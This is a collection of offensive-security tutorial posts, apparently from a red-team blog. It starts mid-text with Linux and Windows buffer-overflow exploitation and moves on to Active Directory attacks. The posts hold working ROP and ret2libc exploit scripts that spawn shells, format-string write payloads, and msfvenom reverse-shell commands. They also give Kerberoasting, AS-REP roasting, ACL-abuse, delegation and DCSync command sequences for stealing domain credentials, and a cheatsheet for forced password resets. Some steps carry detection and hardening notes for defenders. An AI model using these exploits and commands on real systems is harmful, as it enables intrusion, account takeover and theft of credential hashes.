elf = elf('./vulnerable')
rop = rop(elf)

rop.raw(rop.find_gadget(['pop eax', 'ret']))
rop.raw(0xdeadbeef)    # value to pop into eax
print(rop.dump())
print(bytes(rop)) ret2syscall — linux x86 shell via rop call `execve("/bin/sh", null, null)` via the int 0x80 syscall: # execve syscall: eax=11, ebx=/bin/sh, ecx=0, edx=0, int 0x80

from pwn import *

elf  = elf('./vulnerable')

# find gadgets
pop_eax = 0x080bb196  # pop eax; ret
pop_edx_ecx_ebx = 0x0806eb90  # pop edx; pop ecx; pop ebx; ret
int_0x80 = 0x08049421  # int 0x80; ret
bin_sh   = 0x080be408  # "/bin/sh" string address

offset = 76

payload  = b'a' * offset
payload += p32(pop_eax)       # gadget 1
payload += p32(11)            # execve syscall number
payload += p32(pop_edx_ecx_ebx)  # gadget 2
payload += p32(0)             # edx = null
payload += p32(0)             # ecx = null
payload += p32(bin_sh)        # ebx = ptr to "/bin/sh"
payload += p32(int_0x80)      # syscall

p = process('./vulnerable')
p.sendlineafter(b'> ', payload)
p.interactive() pwntools automated rop from pwn import *

elf  = elf('./vulnerable')
libc = elf('/lib/i386-linux-gnu/libc.so.6')
rop  = rop(elf)

# automated: build chain to call system("/bin/sh")
rop.system(next(libc.search(b'/bin/sh')))

payload = b'a' * offset + bytes(rop) ret2plt — defeating aslr with a libc leak # step 1 — leak a libc address via puts@plt
# step 2 — calculate libc base
# step 3 — second payload calls system("/bin/sh")

from pwn import *
elf  = elf('./vuln')
libc = elf('/lib/x86_64-linux-gnu/libc.so.6')
rop  = rop(elf)

# stage 1: leak puts got
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.sym['main'])   # return to main for stage 2

payload1 = b'a' * offset + bytes(rop)

p = process('./vuln')

p.sendlineafter(b'> ', payload1)
raw = p.recvline().strip()
leaked_puts = u64(raw.ljust(8, b'\x00'))

libc_base  = leaked_puts - libc.sym['puts']
log.info(f'libc base: {hex(libc_base)}')

# stage 2: call system("/bin/sh")
libc.address = libc_base
rop2 = rop(libc)
rop2.system(next(libc.search(b'/bin/sh')))

payload2 = b'a' * offset + bytes(rop2)
p.sendlineafter(b'> ', payload2)
p.interactive() format string vulnerabilities format string bugs are a closely related class — not a buffer overflow but often found together and used for the same goal: arbitrary read/write. // vulnerable
printf(user_input);       // user controls format string

// safe
printf("%s", user_input); // format string is hardcoded reading memory # each %p reads one pointer-sized value off the stack
./vulnerable '%p %p %p %p %p %p %p %p'
# output: 0x1 0xffffd290 0xf7e9a000 0x565562a0 0x41414141 ...

# positional read — read the nth value directly
./vulnerable '%7$p'   # reads 7th argument (stack position 7)

# read as string
./vulnerable '%7$s'   # dereferences the 7th pointer and prints as string

# find your input on the stack
./vulnerable 'aaaa.%p.%p.%p.%p.%p.%p.%p.%p'
# when you see 0x41414141 in the output, note its position
# that position number is your offset writing memory with %n `%n` writes the number of bytes printed so far to the address pointed to by the corresponding argument: # overwrite address 0x0804a020 with value 0x41
from pwn import *

target_addr = 0x0804a020

payload = p32(target_addr)   # address to write to
payload += b'%65x'           # print 65 chars (0x41 = 65)
payload += b'%1$n'           # write count to first argument = target_addr
# 4 (from p32) + 65 = 0x45 written... adjust as needed

# pwntools fmtstr helper
payload = fmtstr_payload(offset, {target_addr: value_to_write}) heap exploitation overview heap overflows target dynamically allocated memory. the mechanics differ from stack overflows — instead of overwriting a return address directly, you corrupt heap metadata or adjacent allocations. the glibc heap (ptmalloc) void *ptr = malloc(64);   // allocate 64 bytes
free(ptr);                // return to heap each allocation has a **chunk header** — metadata (size, flags, prev_size) stored adjacent to the data. overflowing one heap chunk can corrupt the header of the next. common heap techniques (overview) # resources for heap exploitation:
# - how2heap (shellphish): https://github.com/shellphish/how2heap
# - azeria labs heap articles
# - malloc internals: https://sourceware.org/glibc/wiki/mallocinternals

# practice:
cd /opt && git clone https://github.com/shellphish/how2heap
# compile and run each example with explanations heap tools in gdb # pwndbg heap commands
heap          # visualise all chunks
bins          # show free lists (tcache, fastbin, etc.)
vis_heap_chunks  # coloured chunk visualisation
try_malloc 24    # simulate malloc to predict return address practice environments intentionally vulnerable applications (windows bof) # brainpan — classic oscp-style bof
# download from: https://www.vulnhub.com/entry/brainpan-1,51/

# vulnserver — multiple bof vulnerabilities
# https://github.com/stephenbradshaw/vulnserver

# dostackbufferoverflowgood
# https://github.com/justinsteven/dostackbufferoverflowgood

# dvwa (web + some bof exercises)
# cloudme 1.11.2 (real-world cve)
# slmail 5.5 (classic oscp example) linux ctf practice # pwn.college — structured curriculum with automated grading
https://pwn.college

# picoctf — beginner-friendly
https://picoctf.org

# pwnable.kr — intermediate
https://pwnable.kr

# exploit.education — vms designed for exploitation
https://exploit.education

# phoenix series (exploit.education)
# stack0 through stack6 — progressive bof challenges
# format0 through format4 — format string challenges

# pwntools solve template
from pwn import *

exe = './phoenix/stack-zero'

if args.remote:
    p = remote('localhost', 9999)
else:
    p = process(exe)

payload = cyclic(200)
p.sendline(payload)
print(p.recvall()) mona.py setup for immunity debugger # download mona.py
# https://github.com/corelan/mona

# place in: c:\program files (x86)\immunity inc\immunity debugger\pycommands\

# in immunity command bar:
!mona config -set workingfolder c:\mona\%p

# essential mona commands:
!mona help
!mona modules           # list modules + protection flags
!mona pattern_create 3000   # cyclic pattern
!mona pattern_offset -q 386f4337  # find offset
!mona findmsp           # find all pattern locations after crash
!mona bytearray -b "\x00"   # create byte array for bad char testing
!mona compare -f path -a addr  # compare memory to bytearray file
!mona jmp -r esp        # find jmp esp
!mona seh               # find pop pop ret for seh
!mona find -s "\xff\xe4"  # find bytes in memory
!mona suggest           # automated exploit suggestions real-world context and cves buffer overflows are not just academic — they have been the root cause of some of the most critical vulnerabilities in history. notable buffer overflow cves eternalblue — why it matters eternalblue (ms17-010) exploited a buffer overflow in windows smbv1 `srvos2featont()`. a crafted smb request caused a heap buffer overflow that ultimately led to arbitrary code execution as system. nsa developed it, shadow brokers leaked it, and wannacry weaponised it — affecting 200,000+ systems in 150 countries. # check if vulnerable
nmap -p 445 --script smb-vuln-ms17-010 target

# metasploit
use exploit/windows/smb/ms17_010_eternalblue
set rhosts target
run modern exploit techniques in the wild today's real exploits rarely use simple stack overflows — modern software is compiled with all protections. real-world bugs involve:

- **type confusion** — treating a value of one type as another to control memory layout
- **integer overflow** — arithmetic wrapping causes undersized allocation, then overflow
- **heap use-after-free** — browser exploitation (chrome, firefox, edge)
- **out-of-bounds write** — writing past array end without classic stack smash
- **race conditions** — toctou (time-of-check time-of-use) enabling concurrent modification

the techniques remain the same — control eip/rip, execute shellcode or rop — but finding the vulnerability and building a reliable exploit is significantly more complex. quick reference cheatsheet bof workflow (windows x86, no protections) 1. fuzz → find crash byte count
2. send cyclic pattern (msf-pattern_create -l length)
3. get eip value from crash → msf-pattern_offset -q value → offset
4. confirm: a*offset + bbbb + c*remainder → eip=42424242
5. bad chars: send \x01-\xff after eip, compare dump to expected
6. jmp esp: !mona jmp -r esp -cpb "badchars"
7. shellcode: msfvenom -p windows/shell_reverse_tcp lhost=ip lport=4444 -f python -b badchars
8. final: a*offset + jmp_esp + nop*16 + shellcode key addresses import struct

# little-endian packing
p32 = lambda x: struct.pack('<i', x)  # 32-bit
p64 = lambda x: struct.pack('<q', x)  # 64-bit

# pwntools
from pwn import p32, p64, u32, u64 gdb shortcuts gdb -q ./vuln
run $(python3 -c "print('a'*200)")
info registers
x/32x $esp
disas $eip
checksec
cyclic 200
cyclic -l 0x6161616e msfvenom payloads msfvenom -p windows/shell_reverse_tcp lhost=ip lport=4444 -f python -b '\x00\x0a\x0d'
msfvenom -p linux/x86/shell_reverse_tcp lhost=ip lport=4444 -f python -b '\x00'
msfvenom -p windows/x64/shell_reverse_tcp lhost=ip lport=4444 -f python
msfvenom -l payloads | grep shell_reverse_tcp protection bypasses summary canary:   leak it (format string) or brute-force fork server
nx/dep:   rop chains, ret2libc
aslr:     leak pointer → calculate base, brute-force 32-bit
pie:      leak binary pointer (partial overwrite)
full relro: require another write primitive

title: BloodHound & Neo4j — Finding the Shortest Path to Domain Admin
summary: A practical BloodHound guide focused on the queries that matter most in an actual engagement: shortest path to Domain Admin, all paths from a specific compromis
body:
bloodhound & neo4j — finding the shortest path to domain admin a practical bloodhound guide focused on the queries that matter most in an actual engagement: shortest path to domain admin, all paths from a specific compromised user, as-rep roastable accounts, high-value acl edges, and writing your own cypher queries when the built-ins don't cover your case. tools bloodhound neo4j active-directory cypher red-team tools bloodhound's value isn't the pretty graph — it's neo4j underneath it, queryable directly with cypher the moment the built-in analysis panel doesn't ask the exact question you need answered. this is a practical reference for collection, the built-in queries worth running on every engagement, and the custom cypher for when they're not enough. collection # full collection -- sessions, acls, group memberships, trusts, gpos, everything
sharphound.exe -c all --zipfilename collection.zip

# stealthier, session-data excluded (reduces noise from session enumeration)
sharphound.exe -c dconly --zipfilename dconly.zip bloodhound-python -u $user -p $pass -d $domain -ns $target_dc -c all --zip import the resulting zip directly into the bloodhound gui's upload panel, or load it straight into neo4j via bloodhound ce's ingest api if scripting the pipeline. once ingested, every query below runs against the same database the gui itself queries — there's no separate data path. the built-in queries worth running on every engagement marking owned objects — do this immediately the moment you compromise any credential, mark it "owned" in the bloodhound gui (right-click the node → mark user as owned), or via cypher directly if scripting the workflow. every subsequent query — especially "shortest paths from owned objects" — becomes immediately more relevant, because it's now reasoning from your actual position in the graph rather than a hypothetical one. match (u:user {name:'compromised_user@domain.com'})
set u.owned = true
return u custom cypher for the questions the gui doesn't ask all paths from a specific user (not just the shortest) the shortest path is useful for a quick win, but a path-count of 1 hop missed because the gui only surfaces the shortest route. this returns every path up to a bounded depth, which is what you actually want when deciding *which* of several viable routes is least likely to trip an alert. match p=(u:user {name:'user@domain.com'})-[*1..4]->(g:group {name:'domain admins@domain.com'})
return p
order by length(p) asc as-rep roastable accounts (with admin-group flag) match (u:user {dontreqpreauth: true})
optional match (u)-[:memberof*1..]->(g:group)
where g.name contains 'admin'
return u.name as account, count(g) > 0 as is_privileged
order by is_privileged desc high-value acl edges — everyone who can reach a specific object useful for the inverse question: not "what can i reach from here" but "who, in this entire domain, could already reach this specific high-value target." this is the query for validating a hardening effort — re-run it after remediation and confirm the result set shrank to exactly the principals who should have access. match p=(u)-[:genericall|genericwrite|writeowner|writedacl|forcechangepassword|addmember|allowedtoact]->(t {name:'target-object@domain.com'})
return p tier-zero exposure — who has any path to any domain controller match p=(u:user)-[*1..3]->(c:computer)
where c.name in [
    n.name | n in [(c2:computer)-[:memberof]->(g:group {name:'domain controllers@domain.com'}) | c2][0..]
]
return distinct u.name
order by u.name every custom cypher query above started as a plain-english question — "who can reach this object," "which roastable accounts are privileged," "what's every path, not just the shortest." translating the question into pattern-matching syntax is mechanical once the question itself is precise; most of the difficulty in writing useful custom queries is in asking a sufficiently specific question, not in cypher syntax itself. bloodhound's edges are only as accurate as the collection — a stale dataset (a permission revoked since collection ran, a group membership changed) produces a path that no longer exists. before reporting any finding derived purely from the graph, confirm it live against the actual domain — `get-domainobjectacl`, a direct ldap query, or simply attempting the abuse in a controlled way — rather than shipping a finding based solely on data that might be days or weeks stale.

title: Active Directory Privilege Escalation — From User to Domain Admin
summary: A structured walkthrough of the most common path from a single standard domain account to Domain Admin: Kerberoasting, AS-REP roasting, ACL abuse, and the three
body:
active directory privilege escalation — from user to domain admin a structured walkthrough of the most common path from a single standard domain account to domain admin: kerberoasting, as-rep roasting, acl abuse, and the three delegation attacks. every step paired with the detection and hardening that closes it. security active-directory privesc kerberos red-team detection-engineering this is the chain that shows up in the overwhelming majority of internal active directory engagements: start with one ordinary, unprivileged domain account — usually from phishing, password spraying, or a default credential — and walk a sequence of misconfigurations that, individually, look minor. none of the steps below require a 0-day. all of them require only that ad's default permissiveness was never actively hardened against. step 0 — enumerate before touching anything every step that follows depends on knowing what's actually in the domain. before attempting any of the techniques below, collect a full picture with bloodhound — it will surface most of these paths automatically, but walking them manually is what lets you explain *why* each one works in a report, and lets you find paths bloodhound's default queries don't highlight. # from a domain-joined linux box or with valid creds remotely
bloodhound-python -u $user -p $pass -d $domain -ns $target_dc -c all

# from windows, with sharphound
sharphound.exe -c all --zipfilename loot.zip step 1 — kerberoasting **attack path.** any domain user can request a kerberos service ticket (tgs) for any account that has a `serviceprincipalname` set — typically service accounts running sql server, web application pools, or scheduled tasks. the tgs is encrypted with a key derived from that service account's password. because no special privilege is required to *request* the ticket, you can request tickets for every spn-bearing account in the domain and crack them offline, entirely outside any logon-attempt rate limiting. # enumerate and request tgs for every spn account in one pass
impacket-getuserspns $domain/$user:$pass -dc-ip $target_dc -request -outputfile kerberoast.txt

# crack offline — service accounts are disproportionately weakly-passworded
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt **detect:** event id 4769 (kerberos service ticket request) with encryption type `0x17` (rc4) requested in bulk for many distinct spns from a single account in a short window — legitimate clients request tickets for the services they actually use, not all of them in sequence.

**harden:** set service account passwords to 25+ random characters (defeats offline cracking outright), prefer group managed service accounts (gmsa) which rotate automatically and aren't human-memorable in the first place, and disable rc4 (`msds-supportedencryptiontypes` set to aes-only) so tickets can't be requested in the weakest cipher. step 2 — as-rep roasting **attack path.** accounts with `do not require kerberos preauthentication` set skip the proof-of-possession step of the as-req/as-rep exchange. anyone — including an attacker with no valid credentials at all, if usernames can be enumerated — can request an as-rep for that account and receive material encrypted with a key derived from its password, crackable offline with zero authentication attempts logged against the account. impacket-getnpusers $domain/$user:$pass -request -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt **detect:** event id 4768 (tgt request) where the pre-authentication type field is absent/null and the requesting principal isn't a known service account that legitimately needs the exemption.

**harden:** remove `dont_req_preauth` from every account that has it unless there's a documented, specific compatibility reason — there almost never is. audit for this flag explicitly; it's frequently a leftover from old application compatibility work nobody revisited. step 3 — acl abuse **attack path.** once you've cracked a service account or user password from steps 1–2, check what *that* account can do via the acls on other ad objects — `genericall`, `genericwrite`, `writeowner`, `writedacl`, and `forcechangepassword` rights granted (often inadvertently, via nested group membership or a helpdesk delegation that was scoped too broadly) let you pivot from one mid-tier account to another, or directly to a high-value target. set-domainobjectowner -targetidentity $target -principalidentity $user
add-domainobjectacl -targetidentity $target -principalidentity $user -rights writedacl
add-domainobjectacl -targetidentity $target -principalidentity $user -rights all **detect:** event id 5136 (directory service object modified) on `ntsecuritydescriptor` attributes for sensitive objects, alerted whenever the modifying principal isn't a known tier-0 administrative account.

**harden:** run a dedicated acl audit (bloodhound's `find principals with dcsync rights` and acl-edge queries, or `dsacls` manually) on every object in the domain admins/enterprise admins chain, and on the domain object itself, at least quarterly — these permissions accumulate silently through helpdesk delegation scripts and are almost never cleaned up proactively. step 4 — delegation attacks 4a. unconstrained delegation **attack path.** a computer account flagged for unconstrained delegation caches a full copy of every kerberos tgt presented to it. compromise that machine (often a legacy application server nobody re-evaluated since deployment) and you can passively or actively (via a coercion technique like petitpotam) capture a domain admin's tgt the next time they authenticate to it. rubeus.exe monitor /interval:5 /nowrap
python3 petitpotam.py -u $user -p $pass $attacker_host $target_dc 4b. constrained delegation **attack path.** an account with `msds-allowedtodelegateto` set can impersonate arbitrary users (via s4u2self/s4u2proxy) against the specific service it's allowed to delegate to — no password for the impersonated user required. rubeus.exe s4u /user:$svcaccount /rc4:<ntlm_hash> /impersonateuser:administrator /msdsspn:cifs/$target /ptt 4c. resource-based constrained delegation (rbcd) **attack path.** if you hold `genericwrite`/`genericall` on a computer object, you can write `msds-allowedtoactonbehalfofotheridentity` yourself, pointing it at a machine account you control, then impersonate any user against that computer — turning a write permission into full impersonation without needing the target's password at any point. new-machineaccount -machineaccount evilpc -password (convertto-securestring 'p@ssw0rd123!' -asplaintext -force)
$computersid = get-domaincomputer evilpc -properties objectsid | select -expand objectsid
get-domaincomputer $target | set-domainobject -set @{'msds-allowedtoactonbehalfofotheridentity'=$computersid}
rubeus.exe s4u /user:evilpc$ /rc4:<evilpc_ntlm_hash> /impersonateuser:administrator /msdsspn:cifs/$target /ptt **detect:** event id 4624 (logon) with logon type 3 immediately following an event id 4768/4769 ticket request showing s4u2self/s4u2proxy flags set, for an account that doesn't normally exhibit delegation behaviour. for unconstrained delegation specifically, monitor for unusual tgt-bearing logons to legacy application servers.

**harden:** eliminate unconstrained delegation entirely wherever possible — there is almost never a real requirement for it that constrained delegation or rbcd with a tightly scoped target list can't satisfy instead. mark sensitive accounts (domain admins, service accounts handling sensitive data) as **"account is sensitive and cannot be delegated"**, which blocks all three delegation types from ever capturing their tickets regardless of any other misconfiguration discovered later. step 5 — dcsync and the finish line **attack path.** by this point you've likely accumulated either domain admin group membership directly, or replication rights (`ds-replication-get-changes` / `ds-replication-get-changes-all`) on the domain object via one of the acl chains above. either is sufficient to pull every credential hash in the domain via dcsync, including `krbtgt` — which, once held, enables golden tickets that survive password resets of any single account, including your original foothold. impacket-secretsdump $domain/$user:$pass@$target_dc -just-dc-user krbtgt **detect:** event id 4662 with the `directory replication services` guid, performed by an account that is not one of the domain's actual domain controllers — this is close to the highest-fidelity single detection in this entire chain, because legitimate dcsync traffic only ever originates from dcs.

**harden:** audit replication-rights grants on the domain object the same way you audit object acls in step 3 — this permission is powerful enough that it should be treated with tier-0 sensitivity and reviewed on every access review cycle, not left to inherited defaults. every step above is a *legitimate kerberos or ad feature*, used exactly as designed, against a configuration that was never actively hardened. none of this is a vulnerability in the cve sense — it's why ad privilege escalation chains are so durable across years of patching: there's nothing to patch. the fix at every layer is configuration discipline (gmsa over human-managed service accounts, no unconstrained delegation, regular acl audits, sensitive accounts flagged as non-delegable) rather than a vendor update.

title: Quick Reference — Active Directory Attack Paths Cheatsheet
summary: Compact reference of the AD attack paths that actually show up in engagements — ACL abuse chains, the three delegation misconfigurations, AS-REP roasting, and D
body:
quick reference — active directory attack paths cheatsheet compact reference of the ad attack paths that actually show up in engagements — acl abuse chains, the three delegation misconfigurations, as-rep roasting, and dcsync prerequisites — each with the exact bloodhound cypher query to find it. notes active-directory cheatsheet bloodhound kerberos privesc not a tutorial — a lookup table. each section below is one attack path: what the misconfiguration looks like, the command to abuse it, and the bloodhound cypher query to find every instance of it in a collected dataset. replace `$user`, `$target`, `$domain` as needed. assumes a collected `sharphound`/`bloodhound-python` dataset already ingested into neo4j for the cypher queries. acl abuse chains active directory's permission model is an acl on every object. the five edges below cover the overwhelming majority of real-world acl abuse paths found by bloodhound. # writeowner -> writedacl -> genericall, three commands
set-domainobjectowner -targetidentity $target -principalidentity $user
add-domainobjectacl -targetidentity $target -principalidentity $user -rights writedacl
add-domainobjectacl -targetidentity $target -principalidentity $user -rights all

# forcechangepassword — direct reset, no current password needed
set-domainuserpassword -identity $target -accountpassword (convertto-securestring 'newp@ss123!' -asplaintext -force) # forcechangepassword via impacket
impacket-changepasswd $domain/$user:$pass@$target_dc -newpass 'newp@ss123!' -altuser $target -altpass dummy -reset

# generic acl edit (owner / dacl) via bloodyad
bloodyad --host $target_dc -d $domain -u $user -p $pass set owner $target $user
bloodyad --host $target_dc -d $domain -u $user -p $pass add genericall $target $user match p=(u:user {name:'user@domain.com'})-[r:genericall|genericwrite|writeowner|writedacl|forcechangepassword|addmember*1..3]->(t)
return p delegation misconfigurations unconstrained delegation an account (usually a computer) flagged for unconstrained delegation caches a copy of every kerberos tgt presented to it by an authenticating user — including domain admins, if you can coerce one to connect. compromise the delegation host and you harvest tickets passively. # monitor for incoming tgts on a compromised unconstrained-delegation host
rubeus.exe monitor /interval:5 /nowrap

# coerce a high-value account (e.g. a dc) to authenticate to you
python3 petitpotam.py -u $user -p $pass $attacker_host $target_dc

# once a tgt lands, pass-the-ticket
rubeus.exe ptt /ticket:<base64 tgt> match (c) where c.unconstraineddelegation = true return c.name constrained delegation (s4u2self / s4u2proxy) an account with `msds-allowedtodelegateto` set can request a service ticket *as any user* (s4u2self) to itself, then exchange that for a service ticket to the delegated-to service (s4u2proxy) — impersonating that user against the target service, no password needed. if `trustedtoauthfordelegation` is also set (protocol transition), this works even for users who never authenticated via kerberos. rubeus.exe s4u /user:$svcaccount /rc4:<svc_account_ntlm_hash> /impersonateuser:administrator /msdsspn:cifs/$target /altservice:cifs,ldap,http /ptt match (c)-[:allowedtodelegate]->(t) return c.name, t.name resource-based constrained delegation (rbcd) rbcd flips the trust direction: the *target* object holds `msds-allowedtoactonbehalfofotheridentity`, listing which principals may delegate to it. if you have genericwrite/genericall on a computer object, you can write this attribute yourself — pointing it at a machine account you control — then impersonate any user against that computer. # 1. create a machine account you control (default: any domain user can add up to 10)
new-machineaccount -machineaccount evilpc -password (convertto-securestring 'p@ssw0rd123!' -asplaintext -force)

# 2. point the target's rbcd attribute at your new machine account's sid
$computersid = get-domaincomputer evilpc -properties objectsid | select -expand objectsid
$sd = new-object security.accesscontrol.rawsecuritydescriptor -argumentlist "o:bad:(a;;ccdclcswrpwpdtlocrsdrcwdwo;;;$computersid)"
$sdbytes = new-object byte[] ($sd.binarylength)
$sd.getbinaryform($sdbytes, 0)
get-domaincomputer $target | set-domainobject -set @{'msds-allowedtoactonbehalfofotheridentity'=$sdbytes}

# 3. request a ticket impersonating a privileged user against the target
rubeus.exe s4u /user:evilpc$ /rc4:<evilpc_ntlm_hash> /impersonateuser:administrator /msdsspn:cifs/$target /ptt match p=(u)-[:genericall|genericwrite|writedacl|writeowner|allowedtoact]->(c:computer) return p as-rep roasting accounts with `dont_req_preauth` (`do not require kerberos preauthentication`) set skip the pre-authentication step in as-req — meaning anyone can request an as-rep for that account *without knowing its password* and receive a portion of it encrypted with the account's password-derived key. crack offline, no logon attempt required, so it generates no failed-logon telemetry. # no credentials needed at all if you can enumerate usernames
impacket-getnpusers $domain/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# with a valid low-priv account, enumerate as-rep-roastable users directly via ldap
impacket-getnpusers $domain/$user:$pass -request -format hashcat -outputfile asrep.txt

# crack offline
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt match (u:user {dontreqpreauth: true}) return u.name dcsync prerequisites dcsync abuses the directory replication service (drs) protocol to ask a domain controller to replicate password hashes for any object — including `krbtgt` — as if your account were a peer dc. it requires no code execution on a dc, only the right *replication* permissions on the domain object itself: `ds-replication-get-changes`, `ds-replication-get-changes-all`, and ideally `ds-replication-get-changes-in-filtered-set` (for filtered attribute sets / rodc scenarios). # pull the krbtgt hash directly — the golden-ticket key material
impacket-secretsdump $domain/$user:$pass@$target_dc -just-dc-user krbtgt

# or via mimikatz on a windows operator box
lsadump::dcsync /domain:$domain /user:krbtgt match p=(u)-[:getchanges|getchangesall]->(d:domain) return p don't chain these manually if you don't have to. once a dataset is ingested, bloodhound's built-in **shortest paths to domain admins** query covers all five categories above (and more — adcs edges, gpo links, session-based lateral movement) in one pass. this cheatsheet exists for when you need to verify *why* an edge exists, reproduce it manually for a report, or write the exact command for a specific hop bloodhound only shows you as a relationship arrow.

title: Active Directory — The Complete Foundation
summary: Domain architecture, authentication protocols, objects, Group Policy, trusts, delegation, and a full red team playbook from initial foothold to domain dominance
body:
active directory — the complete foundation domain architecture, authentication protocols, objects, group policy, trusts, delegation, and a full red team playbook from initial foothold to domain dominance. learn active-directory kerberos ntlm red-team bloodhound privesc domain active directory is the backbone of nearly every enterprise windows environment. it controls who can log in, what they can access, what policies apply to their machines, and how services authenticate to each other. for attackers, ad is the ultimate target — owning a domain controller means owning the entire organisation. for defenders, ad misconfigurations are the most reliable path from a standard user account to complete domain compromise.

this guide builds genuine understanding of ad from the ground up: architecture, objects, authentication protocols, group policy, trusts, and delegation — with red team techniques embedded at every level. if you've read the windows fundamentals post, this goes several layers deeper on everything ad-specific. what active directory is **active directory domain services (ad ds)** is a directory service — a hierarchical database of objects (users, computers, groups, policies) and the protocols used to query and manage them. it provides:

- **authentication** — verifying identity via kerberos or ntlm
- **authorisation** — acls on every object controlling who can read, write, or manage it
- **policy enforcement** — group policy pushes configuration to every machine in the domain
- **service location** — dns and srv records let clients find dcs, printers, and services
- **replication** — changes to ad replicate across all domain controllers automatically the ad database ad runs on **ntds.dit** — a jet (joint engine technology) database stored at `c:\windows\ntds\ntds.dit` on every domain controller. it contains every object in the domain: all user accounts with their password hashes, computer accounts, groups, ous, gpos, and schema definitions.

**this file is the crown jewel.** extract it and you have every domain account's ntlm hash — import it into hashcat and given enough time you crack the entire organisation. this is why domain controller security is non-negotiable.

ntds.dit is locked by the os while the dc is running. you access it via:
- **dcsync** — request replication data from a dc as if you were another dc (requires `ds-replication-get-changes-all` privilege)
- **volume shadow copy** — copy the vss snapshot of the locked file
- **ntdsutil** — built-in tool that can create an ifm (install from media) snapshot
- **physical access / hypervisor** — snapshot the vm, mount the disk domain, forest & trust architecture domain a **domain** is the fundamental administrative unit. it has:
- a **dns name** (`corp.local`, `contoso.com`)
- a **netbios name** (`corp`, `contoso`) — short name, used in `domain\username` notation
- a **domain sid** — all object sids in the domain are derived from this
- one or more **domain controllers** that hold and replicate the ad database
- a **krbtgt** account — a special account whose hash is used to encrypt all kerberos tgts forest a **forest** is a collection of domains that share a single schema, configuration partition, and global catalog. the first domain created is the **forest root domain**. forest: corp.local
├── corp.local          (forest root / parent domain)
│   ├── eu.corp.local   (child domain)
│   └── us.corp.local   (child domain)
└── partner.local       (tree in same forest) **enterprise admins** and **schema admins** groups only exist in the forest root domain — they have forest-wide privilege. trusts a **trust** allows users in one domain to authenticate to resources in another. trusts are directional — a trust *from* a *to* b means users in b can access resources in a. **transitive** means if a trusts b and b trusts c, then a trusts c. forest trusts are transitive within the forest.

**red team:** trusts are lateral movement paths. compromise a domain that is trusted by the target domain → pivot across the trust. child-to-parent escalation via `sid history injection` or the `extrasids` attack lets you forge a tgt with the enterprise admins sid from a compromised child domain — instantly owning the parent and entire forest. domain controllers a **domain controller** is a server running ad ds. it handles authentication requests, enforces policy, and replicates directory data. every domain should have at least two dcs for redundancy. dc roles (fsmo — flexible single master operations) certain ad operations must happen on a single authoritative dc to avoid conflicts — these are the **fsmo roles**: **pdc emulator** is the most attack-relevant: it's the time authority for the domain (kerberos tickets expire based on clock skew — max 5 minutes by default), the target for most credential attacks, and the first dc updated when a password changes. read-only domain controllers (rodc) rodcs hold a read-only copy of ad and are deployed in physically insecure locations (branch offices). only a specified subset of account hashes are cached on the rodc. **rodc compromise does not give you all domain hashes** — only those cached accounts. this is an important containment measure to understand. # domain info
[system.directoryservices.activedirectory.domain]::getcurrentdomain()
(get-addomain).name
(get-addomain).domainsid
(get-addomain).pdcemulator
(get-addomain).ridmaster

# forest info
[system.directoryservices.activedirectory.forest]::getcurrentforest()
get-adforest
(get-adforest).rootdomain
(get-adforest).schemaroleowner
(get-adforest).domainnamingroleowner

# list all dcs
get-addomaincontroller -filter *
get-addomaincontroller -filter * | select name, ipv4address, isglobalcatalog, operatingsystem
nltest /dclist:corp.local

# fsmo role holders
netdom query fsmo
get-addomain | select pdcemulator, ridmaster, infrastructuremaster
get-adforest | select schemamaster, domainnamingmaster

# enumerate domain trusts
get-adtrust -filter *
nltest /domain_trusts
([system.directoryservices.activedirectory.domain]::getcurrentdomain()).getalltrustrelationships()

# powerview
get-netdomain
get-netdomaincontroller
get-netforest
get-netforestdomain
get-netdomaintrust
get-netforesttrust ad objects — users, groups, computers every entity in ad is an **object** — a collection of **attributes** defined by the **schema**. every object has a unique **distinguished name (dn)** describing its position in the hierarchy. dn:  cn=alice smith,ou=sales,ou=users,dc=corp,dc=local
      ↑              ↑               ↑
  common name    org unit       domain components users key user attributes: `useraccountcontrol` flags groups groups have two dimensions:

**scope:**
- **domain local** — contains objects from any domain; used to assign permissions within the local domain
- **global** — contains objects from same domain only; visible forest-wide
- **universal** — contains objects from any domain; replicated to global catalog; used across forests

**type:**
- **security** — has a sid; used for permission assignment and access tokens
- **distribution** — no sid; email lists only privileged groups to know **`admincount = 1`** is set on any account that is or was in a protected group. these accounts are protected by `sdprop` (security descriptor propagator) which resets their acls every 60 minutes from the `adminsdholder` template — useful for persistence if you can modify adminsdholder. # ── users ────────────────────────────────────────────────────────────────────
get-aduser -filter * | select samaccountname, enabled, admincount
get-aduser -filter { admincount -eq 1 } | select samaccountname   # protected accounts
get-aduser -filter * -properties description | 
    where { $_.description -ne $null } | 
    select samaccountname, description   # descriptions often contain passwords!

# accounts with password never expires
get-aduser -filter { passwordneverexpires -eq $true } | select samaccountname

# accounts with dont_require_preauth (as-rep roast targets)
get-aduser -filter { doesnotrequirepreauth -eq $true } | select samaccountname

# service accounts (have spn set = kerberoastable)
get-aduser -filter { serviceprincipalname -ne "$null" } -properties serviceprincipalname |
    select samaccountname, serviceprincipalname

# disabled accounts
get-aduser -filter { enabled -eq $false } | select samaccountname

# ── groups ───────────────────────────────────────────────────────────────────
get-adgroup -filter * | select name, groupscope, groupcategory
get-adgroupmember -identity "domain admins" -recursive
get-adgroupmember -identity "enterprise admins"
get-adgroupmember -identity "backup operators"
get-adgroupmember -identity "dnsadmins"

# find all groups a user is in (recursive)
get-aduser alice -properties memberof | select -expand memberof
(get-aduser alice -properties memberof).memberof | 
    get-adgroup | select name

# ── computers ────────────────────────────────────────────────────────────────
get-adcomputer -filter * | select name, operatingsystem, lastlogondate
get-adcomputer -filter { operatingsystem -like "*2008*" }   # legacy os — easy targets
get-adcomputer -filter { trustedfordelegation -eq $true } | select name   # unconstrained delegation

# ── powerview equivalents ────────────────────────────────────────────────────
get-netuser | select samaccountname, description, admincount, pwdlastset
get-netuser -spn          # kerberoastable users
get-netuser -preauthnotrequired   # as-rep roastable
get-netgroup | select name, admincount
get-netgroupmember -groupname "domain admins" -recurse
get-netcomputer | select name, operatingsystem
get-netcomputer -unconstrained   # unconstrained delegation machines
